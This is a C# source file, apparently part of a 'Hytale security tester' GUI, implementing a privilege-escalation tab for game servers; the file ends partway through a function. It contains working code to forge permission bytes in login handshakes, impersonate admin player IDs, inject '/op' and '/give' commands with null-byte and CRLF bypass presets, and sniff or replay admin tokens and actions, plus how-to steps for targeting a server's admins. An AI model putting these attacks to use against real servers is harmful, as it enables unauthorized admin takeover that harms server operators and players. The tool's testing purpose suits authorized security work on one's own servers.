using ImGuiNET;
using HytaleSecurityTester.Core;
using System.Numerics;
using System.Text;
using System.Net.Sockets;

namespace HytaleSecurityTester.Tabs;

/// <summary>
/// Privilege Escalation - advanced permission validation test suite.
///
/// Sub-tabs:
///   Give Item        - send a give-item packet as a non-OP player
///   Handshake Tamper - forge the PermissionLevel byte in the login/handshake packet
///   Session Spoofer  - wrap outgoing packets with a target admin's PlayerID header
///   Command Inject   - send raw OP commands or embed them in chat/item packets
///   Metadata Inject  - append hidden command strings into item metadata/lore fields
///   Perm Spoof       - prepend an arbitrary permission-level byte to any packet
///
/// Admin Candidates panel (right sidebar):
///   Scanned automatically from recent packets using ContextFiller +
///   PacketAnalyser schema discovery. Click any row to target that player ID
///   across all sub-tabs simultaneously.
/// </summary>
public class PrivilegeTab : ITab
{
    public string Title => "  Privilege Escalation  ";

    private readonly TestLog       _log;
    private readonly PacketCapture _capture;
    private readonly UdpProxy      _udpProxy;
    private readonly ServerConfig  _config;
    private readonly PacketStore   _store;

    // ── Shared fields (all sub-tabs read from these) ───────────────────────
    private int    _itemId        = 1001;
    private int    _itemCount     = 1;
    private int    _targetPlayerId = 0;   // 0 = not set
    private string _targetPlayerName = "";

    // ── Auto-fill ──────────────────────────────────────────────────────────
    private ContextSnapshot?     _lastFill    = null;
    private string               _fillStatus  = "Click [~] to auto-fill from captured packets";
    private List<AdminCandidate> _adminList   = new();
    private int                  _adminLastPkt = 0;
    private bool                 _adminScanRunning = false;  // BG scan guard
    private DateTime             _adminScanTime = DateTime.MinValue;
    private int                  _selectedAdmin = -1;

    // ── Sub-tab ────────────────────────────────────────────────────────────
    private int _subTab = 0;
    private static readonly string[] SubTabs =
        { "Give Item", "Handshake Tamper", "Session Spoofer",
          "Command Inject", "Metadata Inject", "Perm Spoof", "Response Table",
          "Token Sniff", "Spawn Items", "Admin Replay", "Conn Tests" };

    // ── Give Item ──────────────────────────────────────────────────────────
    private int _giItemId   = 1001;
    private int _giCount    = 1;
    private int _giPlayerId = 1;

    // ── Token Sniff ────────────────────────────────────────────────────────
    private List<TokenEntry> _tokens        = new();
    private int              _tokLastPkt    = 0;
    private bool             _tokScanRunning = false;  // BG token scan guard
    private bool             _tokReplaying  = false;
    private int              _tokSelectedIdx = -1;

    // ── Spawn Items ────────────────────────────────────────────────────────
    private int    _spawnItemId    = 1001;
    private int    _spawnCount     = 64;
    private int    _spawnTargetId  = 0;
    private string _spawnTargetName = "";
    private int    _spawnMethod    = 0;   // 0=direct packet  1=/give  2=/i  3=/spawnitem  4=/item
    private string _spawnCustomCmd = "/give {target} diamond 64";
    private bool   _spawnRepeatMode = false;
    private int    _spawnRepeatN   = 1;
    private int    _spawnRepeatDelay = 100;
    private static readonly string[] SpawnMethods =
        { "Raw 0x2A packet", "/give command", "/i shorthand", "/spawnitem", "/item", "Custom command" };

    // ── Admin Replay ───────────────────────────────────────────────────────
    private List<AdminActionEntry> _adminActions  = new();
    private int    _arLastPktCount = 0;
    private int    _arSelectedIdx  = -1;
    private bool   _arArmed        = false;
    private bool   _arReplaying    = false;
    private int    _arReplayCount  = 1;
    private int    _arReplayDelay  = 50;

    // ── Handshake Tamper ──────────────────────────────────────────────────
    private int    _hsPermLevel   = 4;       // 0=guest ... 4=owner
    private int    _hsPlayerIdInPkt = 1;
    private string _hsUsername    = "admin";
    private int    _hsVersion     = 1;
    private bool   _hsReuseCapture = false;  // mutate a captured handshake
    private string _hsCapturedHex = "";      // base packet to mutate
    private int    _hsPermByteOff = 2;       // offset where perm byte lives
    private string _hsSendLog     = "";

    // ── Session Spoofer ────────────────────────────────────────────────────
    private int    _ssAdminId       = 0;
    private string _ssPayloadHex    = "";
    private bool   _ssWrapAllFields = true;
    private int    _ssSendCount     = 1;
    private int    _ssDelayMs       = 0;
    private string _ssBookLabel     = "";

    // ── Command Inject ────────────────────────────────────────────────────
    private int    _ciMode        = 0;   // 0=raw  1=chat-append  2=item-embed
    private string _ciCommand     = "/op {target}";
    private string _ciChatHex     = "";
    private string _ciItemHex     = "";
    private int    _ciRepeat      = 1;
    private bool   _ciNullDelimit = true;   // separate injection with \0
    private static readonly string[] CommandPresets =
    {
        "/op {target}",
        "/gamemode creative {target}",
        "/give {target} diamond 64",
        "/grant {target} * true",
        "/perm set {target} level 4",
        "\0/op {target}",       // null-prefix bypass
        "\r\n/op {target}",     // CRLF bypass
        "  \t/op {target}",     // whitespace prefix bypass
    };
    private int _ciPresetIdx = 0;

    // ── Metadata Inject ───────────────────────────────────────────────────
    private string _miBaseHex      = "";    // item packet to mutate
    private string _miInjectStr    = "/op {target}";
    private int    _miSearchOffset = 8;     // byte offset where string region starts
    private bool   _miAppend       = true;  // append vs overwrite
    private bool   _miNullTerm     = true;
    private string _miPreview      = "";

    // ── Perm Spoof ────────────────────────────────────────────────────────
    private bool   _psEnabled      = true;
    private int    _psLevel        = 4;
    private string _psHex          = "";
    private bool   _psWrapWithId   = false; // also prepend admin player ID
    private int    _psWrappedId    = 0;

    // ── Conn Tests (merged from ConnectionTab) ─────────────────────────────
    private bool   _ctHandshakeTamper = true;
    private bool   _ctAuthBypass      = true;
    private bool   _ctSessionHijack   = false;
    private bool   _ctTimeoutTest     = true;
    private int    _ctFakeSessionId   = 99999;
    private string _ctFakeToken       = "aaaabbbbccccdddd";
    private int    _ctTimeoutMs       = 30000;

    // ── Constructor ────────────────────────────────────────────────────────
    public PrivilegeTab(TestLog log, PacketCapture capture, UdpProxy udpProxy,
                        ServerConfig config, PacketStore store)
    {
        _log = log; _capture = capture; _udpProxy = udpProxy;
        _config = config; _store = store;
    }

    // ── Render ────────────────────────────────────────────────────────────

    public void Render()
    {
        float fullW = ImGui.GetContentRegionAvail().X;
        float sideW = 220f;
        float mainW = fullW - sideW - 8f;

        // Refresh admin candidate list when new packets arrive
        // BUG FIX: BuildAdminCandidates iterates 300 packets synchronously on the render
        // thread, which causes visible freezes (especially when first switching to this tab).
        // Now we kick it off in a background Task and update _adminList when done.
        var pkts = _capture.GetPackets();
        if (!_adminScanRunning && pkts.Count != _adminLastPkt &&
            (DateTime.Now - _adminScanTime).TotalMilliseconds > 1500)
        {
            _adminScanRunning = true;
            _adminLastPkt    = pkts.Count;
            _adminScanTime   = DateTime.Now;
            var snapshot = pkts;  // captured before Task starts
            System.Threading.Tasks.Task.Run(() =>
            {
                try   { var result = BuildAdminCandidates(snapshot); _adminList = result; }
                catch { /* swallow - non-critical background scan */ }
                finally { _adminScanRunning = false; }
            });
        }

        // ── Status + auto-fill bar (full width) ───────────────────────────
        RenderStatusBar(fullW);
        ImGui.Spacing();
        RenderAutoFillBar(fullW);
        ImGui.Spacing();

        // ── Sub-tab bar - scrollable, handles overflow automatically ─────
        if (ImGui.BeginTabBar("##priv_subtabs", ImGuiTabBarFlags.FittingPolicyScroll))
        {
            for (int i = 0; i < SubTabs.Length; i++)
                if (ImGui.TabItemButton(SubTabs[i] + $"##st{i}", ImGuiTabItemFlags.None))
                    _subTab = i;
            ImGui.EndTabBar();
        }

        ImGui.Spacing(); ImGui.Spacing();

        // ── Two-column layout: main content + admin sidebar ───────────────
        float availH = ImGui.GetContentRegionAvail().Y;

        // Main content column
        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg1);
        ImGui.BeginChild("##privmain", new Vector2(mainW, availH), ImGuiChildFlags.None);
        ImGui.PopStyleColor();
        // ── Token and admin action auto-scan ─────────────────────────────
        // BUG FIX: ScanTokens was also sync on render thread - kick to background
        if (!_tokScanRunning && pkts.Count != _tokLastPkt)
        {
            _tokScanRunning = true;
            _tokLastPkt     = pkts.Count;
            var tSnapshot = pkts;
            System.Threading.Tasks.Task.Run(() =>
            {
                try   { ScanTokensAndAdminActions(tSnapshot); }
                catch { }
                finally { _tokScanRunning = false; }
            });
        }

        switch (_subTab)
        {
            case 0: RenderGiveItem(mainW);        break;
            case 1: RenderHandshakeTamper(mainW); break;
            case 2: RenderSessionSpoofer(mainW);  break;
            case 3: RenderCommandInject(mainW);   break;
            case 4: RenderMetadataInject(mainW);  break;
            case 5: RenderPermSpoof(mainW);       break;
            case 6: RenderResponseTable(mainW);   break;
            case 7: RenderTokenSniff(mainW);      break;
            case 8: RenderSpawnItems(mainW);      break;
            case 9: RenderAdminReplay(mainW);     break;
            case 10: RenderConnTests(mainW);     break;
        }
        ImGui.EndChild();

        ImGui.SameLine(0, 8);

        // Admin Candidates sidebar
        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg1);
        ImGui.BeginChild("##privside", new Vector2(sideW, availH), ImGuiChildFlags.Border);
        ImGui.PopStyleColor();
        RenderAdminSidebar(sideW);
        ImGui.EndChild();
    }

    // ══════════════════════════════════════════════════════════════════════
    // ADMIN CANDIDATES SIDEBAR
    // ══════════════════════════════════════════════════════════════════════

    private void RenderAdminSidebar(float w)
    {
        ImGui.SetCursorPos(new Vector2(8, 6));
        ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColAccentMid);
        ImGui.TextUnformatted("ADMIN CANDIDATES");
        ImGui.PopStyleColor();
        ImGui.SameLine();
        ImGui.SetCursorPosX(w - 28);
        UiHelper.SecondaryButton("[~]##admscan", 22, 18, () =>
        {
            _adminList    = BuildAdminCandidates(_capture.GetPackets());
            _adminScanTime = DateTime.Now;
            _log.Info($"[PrivEsc] Admin scan: {_adminList.Count} candidates found.");
        });

        // Current target display
        if (_targetPlayerId > 0)
        {
            ImGui.SetCursorPosX(6);
            ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColAccentDim);
            ImGui.BeginChild("##tgtbox", new Vector2(w - 12, 34), ImGuiChildFlags.Border);
            ImGui.PopStyleColor();
            ImGui.SetCursorPos(new Vector2(6, 4));
            ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
            ImGui.TextUnformatted($"[*] Target: {_targetPlayerId}");
            ImGui.PopStyleColor();
            if (_targetPlayerName.Length > 0)
            {
                ImGui.SameLine(0, 6);
                UiHelper.MutedLabel($"({_targetPlayerName})");
            }
            ImGui.EndChild();
            ImGui.Spacing();
        }

        // Separator
        var dl = ImGui.GetWindowDrawList();
        float sepY = ImGui.GetCursorScreenPos().Y;
        dl.AddLine(new Vector2(ImGui.GetWindowPos().X + 4, sepY),
                   new Vector2(ImGui.GetWindowPos().X + w - 4, sepY),
                   ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColBorder));
        ImGui.Spacing();

        // Column header
        ImGui.SetCursorPosX(8);
        UiHelper.MutedLabel($"  {"ID",-8} {"x",-5} {"Name",-10}");
        ImGui.Spacing();

        if (_adminList.Count == 0)
        {
            ImGui.SetCursorPosX(8);
            UiHelper.MutedLabel("None found yet.");
            ImGui.SetCursorPosX(8);
            UiHelper.MutedLabel("Capture traffic while");
            ImGui.SetCursorPosX(8);
            UiHelper.MutedLabel("admins are online.");
            return;
        }

        for (int i = 0; i < _adminList.Count; i++)
        {
            var c   = _adminList[i];
            bool sel = _selectedAdmin == i || (_targetPlayerId > 0 && (uint)_targetPlayerId == c.PlayerId);

            if (sel)
            {
                var sp = ImGui.GetCursorScreenPos();
                dl.AddRectFilled(sp, sp + new Vector2(w - 8, 20),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColWarnDim));
            }

            // Row: selectable fills name/ID across all sub-tabs
            ImGui.PushStyleColor(ImGuiCol.Text,
                sel ? MenuRenderer.ColWarn : MenuRenderer.ColBlue);
            if (ImGui.Selectable(
                $"  {c.PlayerId,-8}x{c.Seen,-4} {(c.Name ?? "?"),-10}##adm{i}",
                sel, ImGuiSelectableFlags.None, new Vector2(w - 12, 20)))
            {
                _selectedAdmin      = i;
                _targetPlayerId     = (int)c.PlayerId;
                _targetPlayerName   = c.Name ?? "";
                // Push into all sub-tab fields
                _giPlayerId   = (int)c.PlayerId;
                _ssAdminId    = (int)c.PlayerId;
                _psWrappedId  = (int)c.PlayerId;
                _hsPlayerIdInPkt = (int)c.PlayerId;
                _log.Success($"[PrivEsc] Target locked -> ID {c.PlayerId}" +
                             (c.Name != null ? $" ({c.Name})" : "") +
                             $" seenx{c.Seen}");
            }
            ImGui.PopStyleColor();
        }

        // Book-packet admin hints
        var bookPkts = _store.GetAll();
        if (bookPkts.Count > 0)
        {
            ImGui.Spacing();
            var dlb = ImGui.GetWindowDrawList();
            float sy2 = ImGui.GetCursorScreenPos().Y;
            dlb.AddLine(new Vector2(ImGui.GetWindowPos().X + 4, sy2),
                        new Vector2(ImGui.GetWindowPos().X + w - 4, sy2),
                        ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColBorder));
            ImGui.Spacing();
            ImGui.SetCursorPosX(8);
            UiHelper.MutedLabel("FROM PACKET BOOK");
            ImGui.Spacing();

            foreach (var saved in bookPkts.Take(8))
            {
                ImGui.SetCursorPosX(8);
                UiHelper.MutedLabel($"  {saved.Label[..Math.Min(22, saved.Label.Length)]}");
                ImGui.SameLine();
                ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
                ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColTextMuted);
                if (ImGui.Button($"->##bk{saved.Label.GetHashCode()}", new Vector2(22, 16)))
                {
                    // Load into the relevant sub-tab hex field
                    switch (_subTab)
                    {
                        case 1: _hsCapturedHex = saved.HexString; _hsReuseCapture = true; break;
                        case 2: _ssPayloadHex  = saved.HexString; break;
                        case 4: _miBaseHex     = saved.HexString; break;
                        case 5: _psHex         = saved.HexString; break;
                    }
                    _log.Info($"[PrivEsc] Loaded '{saved.Label}' into current sub-tab.");
                }
                ImGui.PopStyleColor(2);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: GIVE ITEM
    // ══════════════════════════════════════════════════════════════════════

    private void RenderGiveItem(float w)
    {
        UiHelper.SectionBox("GIVE ITEM (AS NON-OP)", w, 200, () =>
        {
            UiHelper.MutedLabel("Sends a 0x2A give-item packet as a normal player.");
            UiHelper.MutedLabel("If the server only validates permissions client-side, the item appears.");
            ImGui.Spacing();

            ImGui.SetNextItemWidth(130);
            ImGui.InputInt("Item ID##giid", ref _giItemId);
            _giItemId = Math.Max(1, _giItemId);
            ImGui.SameLine(0, 6);
            InlineAutoFill("##giaf", () =>
            {
                var f = ContextFiller.Fill(_capture, _udpProxy);
                if (f.HasItem) { _giItemId = (int)f.ItemId!.Value; }
            });

            ImGui.SetNextItemWidth(100);
            ImGui.InputInt("Amount##gicnt", ref _giCount);
            _giCount = Math.Max(1, _giCount);

            ImGui.SetNextItemWidth(130);
            ImGui.InputInt("Target Player ID##gpid", ref _giPlayerId);
            ImGui.SameLine(0, 8);
            UiHelper.MutedLabel(_targetPlayerId > 0
                ? $"<- or use admin target ({_targetPlayerId})" : "<- or select from sidebar");

            ImGui.Spacing();

            UiHelper.WarnButton("Send Give Item##girun", 200, 32, () =>
            {
                var pkt = new List<byte> { 0x2A };
                pkt.AddRange(BitConverter.GetBytes(_giItemId));
                pkt.AddRange(BitConverter.GetBytes(_giCount));
                pkt.AddRange(BitConverter.GetBytes(_giPlayerId));
                SendRaw(pkt.ToArray());
                _log.Info($"[PrivEsc] Give item - ItemID={_giItemId}x{_giCount}" +
                          $" -> PlayerID={_giPlayerId}");
            });

            ImGui.Spacing();
            UiHelper.MutedLabel("Item appears -> server trusts client  |  Kick/error -> permission checked.");
        });
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: HANDSHAKE TAMPER
    // ══════════════════════════════════════════════════════════════════════

    private void RenderHandshakeTamper(float w)
    {
        UiHelper.SectionBox("HANDSHAKE TAMPER - PERMISSION LEVEL INJECTION", w, 310, () =>
        {
            UiHelper.MutedLabel("Forges the PermissionLevel field in the initial connection packet (0x10).");
            UiHelper.MutedLabel("A vulnerable server uses this value to grant admin rights at login.");
            ImGui.Spacing();

            // Mode: forge from scratch OR mutate a captured handshake
            ImGui.Checkbox("Mutate a captured handshake packet##hsrc", ref _hsReuseCapture);
            ImGui.Spacing();

            if (_hsReuseCapture)
            {
                // ── Mutate mode ───────────────────────────────────────────
                UiHelper.MutedLabel("Paste a captured handshake hex (from Book or Packet Log):");
                ImGui.SetNextItemWidth(-1);
                ImGui.InputText("Captured hex##hscap", ref _hsCapturedHex, 1024);

                ImGui.SetNextItemWidth(90);
                ImGui.InputInt("Perm byte offset##hsoff", ref _hsPermByteOff);
                _hsPermByteOff = Math.Max(0, _hsPermByteOff);
                ImGui.SameLine(0, 8);
                UiHelper.MutedLabel("Byte position in packet where the perm flag lives");

                ImGui.SetNextItemWidth(90);
                ImGui.InputInt("New perm level##hsnpl", ref _hsPermLevel);
                _hsPermLevel = Math.Clamp(_hsPermLevel, 0, 255);
                ImGui.SameLine(0, 8);
                UiHelper.MutedLabel("0=guest  1=member  2=mod  3=admin  4=owner");
                ImGui.Spacing();

                UiHelper.WarnButton("Send Mutated Handshake##hsmutsend", 240, 32, () =>
                {
                    if (string.IsNullOrWhiteSpace(_hsCapturedHex))
                    { _log.Error("[Handshake] No captured packet - paste hex or load from Book."); return; }
                    try
                    {
                        byte[] raw = HexToBytes(_hsCapturedHex);
                        if (_hsPermByteOff >= raw.Length)
                        { _log.Error($"[Handshake] Offset {_hsPermByteOff} out of range ({raw.Length}b)."); return; }
                        raw[_hsPermByteOff] = (byte)_hsPermLevel;
                        SendRaw(raw);
                        _hsSendLog = $"Sent {raw.Length}b - perm byte @ offset {_hsPermByteOff} " +
                                     $"set to 0x{_hsPermLevel:X2} ({PermName(_hsPermLevel)})";
                        _log.Success($"[Handshake] {_hsSendLog}");
                    }
                    catch (Exception ex) { _log.Error($"[Handshake] {ex.Message}"); }
                });
            }
            else
            {
                // ── Forge-from-scratch mode ───────────────────────────────
                ImGui.SetNextItemWidth(130);
                ImGui.InputText("Username##hsun", ref _hsUsername, 32);
                ImGui.SameLine(0, 6);
                InlineAutoFill("##hsunaf", () =>
                {
                    var f = ContextFiller.Fill(_capture, _udpProxy);
                    if (f.PlayerName != null) _hsUsername = f.PlayerName;
                });

                ImGui.SetNextItemWidth(130);
                ImGui.InputInt("Player ID##hspid", ref _hsPlayerIdInPkt);
                ImGui.SameLine(0, 8);
                UiHelper.MutedLabel(_targetPlayerId > 0 ? $"(admin target: {_targetPlayerId})" : "");

                ImGui.SetNextItemWidth(90);
                ImGui.InputInt("Protocol version##hsver", ref _hsVersion);
                _hsVersion = Math.Max(0, _hsVersion);

                ImGui.SetNextItemWidth(90);
                ImGui.InputInt("Permission level##hspl", ref _hsPermLevel);
                _hsPermLevel = Math.Clamp(_hsPermLevel, 0, 255);
                ImGui.SameLine(0, 8);
                ImGui.PushStyleColor(ImGuiCol.Text, PermColor(_hsPermLevel));
                ImGui.TextUnformatted(PermName(_hsPermLevel));
                ImGui.PopStyleColor();

                ImGui.Spacing();

                // Show packet preview
                byte[] preview = BuildHandshakePacket();
                UiHelper.MutedLabel($"Packet preview ({preview.Length}b): {BytesToHex(preview, 24)}");
                ImGui.Spacing();

                UiHelper.WarnButton("Send Forged Handshake##hssendf", 230, 32, () =>
                {
                    byte[] pkt = BuildHandshakePacket();
                    SendRaw(pkt);
                    _hsSendLog = $"Sent {pkt.Length}b - user='{_hsUsername}' " +
                                 $"perm=0x{_hsPermLevel:X2} ({PermName(_hsPermLevel)}) " +
                                 $"playerID={_hsPlayerIdInPkt}";
                    _log.Info($"[Handshake] {_hsSendLog}");
                });
            }

            ImGui.Spacing();
            if (_hsSendLog.Length > 0)
            {
                ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
                ImGui.TextUnformatted($"  ↳ {_hsSendLog}");
                ImGui.PopStyleColor();
            }

            ImGui.Spacing();
            RenderHowTo(
                "1. Start the Capture proxy BEFORE launching the game client",
                "2. Join the server - the handshake is the first C->S packet",
                "3. Copy the hex from Packet Log (0x10 packet) -> paste above",
                "4. Set the permission byte offset (usually bytes 5-9)",
                "5. Set perm level to 3 or 4, send, watch for elevated rights",
                "6. Server grants admin = perm level not re-validated server-side");
        });
    }

    private byte[] BuildHandshakePacket()
    {
        // Layout: [0x10] [version:2] [playerID:4] [permLevel:1] [nameLen:2] [name:n]
        var pkt = new List<byte>();
        pkt.Add(0x10);
        pkt.AddRange(BitConverter.GetBytes((ushort)_hsVersion));
        pkt.AddRange(BitConverter.GetBytes(_hsPlayerIdInPkt));
        pkt.Add((byte)_hsPermLevel);
        byte[] nameBytes = Encoding.UTF8.GetBytes(_hsUsername);
        pkt.AddRange(BitConverter.GetBytes((ushort)nameBytes.Length));
        pkt.AddRange(nameBytes);
        return pkt.ToArray();
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: SESSION ID SPOOFER
    // ══════════════════════════════════════════════════════════════════════

    private void RenderSessionSpoofer(float w)
    {
        UiHelper.SectionBox("SESSION ID SPOOFER", w, 340, () =>
        {
            UiHelper.MutedLabel("Wraps outgoing packets with a target admin's PlayerID in the header.");
            UiHelper.MutedLabel("Tests if the server validates the sender ID server-side or trusts the packet field.");
            ImGui.Spacing();

            // Admin target
            ImGui.SetNextItemWidth(140);
            ImGui.InputInt("Admin Player ID##ssaid", ref _ssAdminId);
            ImGui.SameLine(0, 6);
            InlineAutoFill("##ssaf", () =>
            {
                var f = ContextFiller.Fill(_capture, _udpProxy);
                if (f.HasPlayer) _ssAdminId = (int)(f.PlayerId ?? (uint)_ssAdminId);
            });
            ImGui.SameLine(0, 8);
            if (_targetPlayerId > 0)
            {
                ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
                ImGui.TextUnformatted($"[*] Sidebar: {_targetPlayerId}");
                ImGui.PopStyleColor();
                ImGui.SameLine(0, 6);
                UiHelper.SecondaryButton("Use##ssuse", 40, 22,
                    () => _ssAdminId = _targetPlayerId);
            }

            ImGui.Spacing();

            // Payload
            ImGui.Checkbox("Wrap all 4-byte ID fields in payload##sswrap", ref _ssWrapAllFields);
            ImGui.Spacing();
            UiHelper.MutedLabel("Payload packet hex (the packet to inject as the admin):");
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("##sspayload", ref _ssPayloadHex, 1024);

            // Book picker
            var saved = _store.GetAll();
            if (saved.Count > 0)
            {
                ImGui.SetNextItemWidth(280);
                if (ImGui.BeginCombo("Load from Book##ssbook", _ssBookLabel))
                {
                    foreach (var s in saved)
                    {
                        if (ImGui.Selectable(s.Label))
                        { _ssPayloadHex = s.HexString; _ssBookLabel = s.Label; }
                        if (ImGui.IsItemHovered())
                            ImGui.SetTooltip(s.Notes.Length > 0 ? s.Notes
                                : s.HexString[..Math.Min(40, s.HexString.Length)]);
                    }
                    ImGui.EndCombo();
                }
            }

            ImGui.Spacing();
            ImGui.SetNextItemWidth(90); ImGui.InputInt("Repeat##ssrep", ref _ssSendCount);
            _ssSendCount = Math.Clamp(_ssSendCount, 1, 100);
            ImGui.SameLine(0, 12);
            ImGui.SetNextItemWidth(90); ImGui.InputInt("Delay ms##ssdly", ref _ssDelayMs);
            _ssDelayMs = Math.Max(0, _ssDelayMs);
            ImGui.Spacing();

            UiHelper.WarnButton("Send Spoofed Packet(s)##ssrun", 220, 32, () =>
            {
                if (_ssAdminId <= 0)
                { _log.Error("[SessionSpoof] Set a target Admin Player ID first."); return; }
                if (string.IsNullOrWhiteSpace(_ssPayloadHex))
                { _log.Error("[SessionSpoof] Paste a payload packet first."); return; }
                try
                {
                    byte[] payload = HexToBytes(_ssPayloadHex);
                    int delay = _ssDelayMs;
                    int count = _ssSendCount;
                    _log.Info($"[SessionSpoof] Wrapping {payload.Length}b payload with AdminID={_ssAdminId}" +
                              $"x {count} (delay {delay}ms)");
                    Task.Run(async () =>
                    {
                        for (int i = 0; i < count; i++)
                        {
                            byte[] wrapped = WrapWithPlayerId((uint)_ssAdminId, payload, _ssWrapAllFields);
                            SendRaw(wrapped);
                            _log.Info($"[SessionSpoof] #{i+1}: {wrapped.Length}b sent - " +
                                      $"hex prefix: {BytesToHex(wrapped, 8)}...");
                            if (delay > 0) await Task.Delay(delay);
                        }
                        _log.Success($"[SessionSpoof] Done - {count} wrapped packet(s) sent.");
                    });
                }
                catch (Exception ex) { _log.Error($"[SessionSpoof] {ex.Message}"); }
            });

            ImGui.Spacing();
            RenderHowTo(
                "1. Identify an admin's PlayerID - watch for high-privilege actions in the Packet Log",
                "2. Select their ID from the sidebar (auto-scanned) or enter manually",
                "3. Paste any C->S packet hex you want to execute as that admin",
                "4. 'Wrap all ID fields' replaces every matching 4-byte sender ID in the payload",
                "5. Server accepts action = session ID not validated  |  Reject = secure binding");
        });
    }

    /// <summary>
    /// Builds the spoofed packet: [adminId:4] [original payload].
    /// If replaceFields=true, also patches any occurrence of the current
    /// player's ID inside the payload with the admin's ID.
    /// </summary>
    private byte[] WrapWithPlayerId(uint adminId, byte[] payload, bool replaceFields)
    {
        var result = new List<byte>();
        // Prepend admin ID as the session/sender header field
        result.AddRange(BitConverter.GetBytes(adminId));

        if (replaceFields)
        {
            // Scan payload for any 4-byte int that looks like our own player ID
            // (we replace any value in the entity/player band with the admin ID)
            byte[] copy = (byte[])payload.Clone();
            for (int i = 0; i + 4 <= copy.Length; i++)
            {
                int v = BitConverter.ToInt32(copy, i);
                if (v >= 1000 && v <= 999_999 && (uint)v != adminId)
                {
                    byte[] rep = BitConverter.GetBytes(adminId);
                    copy[i]   = rep[0]; copy[i+1] = rep[1];
                    copy[i+2] = rep[2]; copy[i+3] = rep[3];
                }
            }
            result.AddRange(copy);
        }
        else
        {
            result.AddRange(payload);
        }

        return result.ToArray();
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: COMMAND INJECT
    // ══════════════════════════════════════════════════════════════════════

    private void RenderCommandInject(float w)
    {
        // Mode selector
        float modeW = (w - 8) / 3f;
        string[] modes = { "Raw Command", "Chat Append", "Item Embed" };
        for (int i = 0; i < modes.Length; i++)
        {
            bool sel = _ciMode == i;
            ImGui.PushStyleColor(ImGuiCol.Button,
                sel ? new Vector4(0.18f, 0.95f, 0.45f, 0.22f) : MenuRenderer.ColBg3);
            ImGui.PushStyleColor(ImGuiCol.Text,
                sel ? MenuRenderer.ColAccent : MenuRenderer.ColTextMuted);
            if (ImGui.Button(modes[i] + $"##cim{i}", new Vector2(modeW, 26))) _ciMode = i;
            ImGui.PopStyleColor(2);
            if (i < modes.Length - 1) ImGui.SameLine(0, 4);
        }

        ImGui.Spacing();

        switch (_ciMode)
        {
            case 0: RenderCommandInjectRaw(w);        break;
            case 1: RenderCommandInjectChatAppend(w); break;
            case 2: RenderCommandInjectItemEmbed(w);  break;
        }
    }

    private void RenderCommandInjectRaw(float w)
    {
        UiHelper.SectionBox("RAW COMMAND INJECTION", w, 260, () =>
        {
            UiHelper.MutedLabel("Sends a C->S chat/command packet (0x01) directly.");
            UiHelper.MutedLabel("Tests if the server checks OP permission before executing server commands.");
            ImGui.Spacing();

            // Preset picker
            ImGui.SetNextItemWidth(360);
            if (ImGui.BeginCombo("Preset##cipreset",
                CommandPresets[_ciPresetIdx].Replace("\0","\\0").Replace("\r\n","\\r\\n").Replace("\t","\\t")))
            {
                for (int i = 0; i < CommandPresets.Length; i++)
                {
                    string display = CommandPresets[i]
                        .Replace("\0","\\0").Replace("\r\n","\\r\\n").Replace("\t","\\t");
                    if (ImGui.Selectable(display, _ciPresetIdx == i))
                    {
                        _ciPresetIdx = i;
                        _ciCommand   = CommandPresets[i]
                            .Replace("{target}", _targetPlayerName.Length > 0
                                ? _targetPlayerName : _targetPlayerId > 0
                                ? _targetPlayerId.ToString() : "@s");
                    }
                }
                ImGui.EndCombo();
            }

            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("Command##cicmd", ref _ciCommand, 256);
            UiHelper.MutedLabel("Use {target} - it is replaced with the selected admin's name/ID.");

            ImGui.Spacing();
            ImGui.Checkbox("Null-byte delimiter before command##cind", ref _ciNullDelimit);
            ImGui.SetNextItemWidth(90);
            ImGui.InputInt("Repeat##cirep", ref _ciRepeat);
            _ciRepeat = Math.Clamp(_ciRepeat, 1, 50);
            ImGui.Spacing();

            UiHelper.WarnButton("Send Command(s)##cirawsend", 200, 32, () =>
            {
                string cmd = ResolveTarget(_ciCommand);
                _log.Info($"[CmdInject/Raw] Sending {_ciRepeat}x: {cmd.Replace("\0","\\0")}");
                Task.Run(() =>
                {
                    for (int n = 0; n < _ciRepeat; n++)
                    {
                        byte[] pkt = BuildChatPacket(cmd, _ciNullDelimit);
                        SendRaw(pkt);
                    }
                    _log.Success($"[CmdInject/Raw] {_ciRepeat} packet(s) sent.");
                });
            });

            ImGui.Spacing();
            UiHelper.MutedLabel("Executes = server trusts client command perms");
            UiHelper.MutedLabel("No effect / kick = server validates OP level [OK]");
        });
    }

    private void RenderCommandInjectChatAppend(float w)
    {
        UiHelper.SectionBox("CHAT PACKET COMMAND APPEND", w, 290, () =>
        {
            UiHelper.MutedLabel("Takes a captured chat packet and appends a hidden command string.");
            UiHelper.MutedLabel("Some parsers split on \\0 or \\n - the appended payload may be executed separately.");
            ImGui.Spacing();

            UiHelper.MutedLabel("Base chat packet hex:");
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("##cichat", ref _ciChatHex, 1024);

            // Book picker
            var saved = _store.GetAll();
            if (saved.Count > 0 && ImGui.BeginCombo("Load chat##cichatbook", ""))
            {
                foreach (var s in saved.Where(s => s.Direction == PacketDirection.ClientToServer))
                {
                    if (ImGui.Selectable(s.Label)) _ciChatHex = s.HexString;
                }
                ImGui.EndCombo();
            }

            ImGui.Spacing();
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("Inject string##ciappend", ref _ciCommand, 256);
            ImGui.Checkbox("Null-byte delimiter##caind", ref _ciNullDelimit);
            ImGui.Spacing();

            // Preview
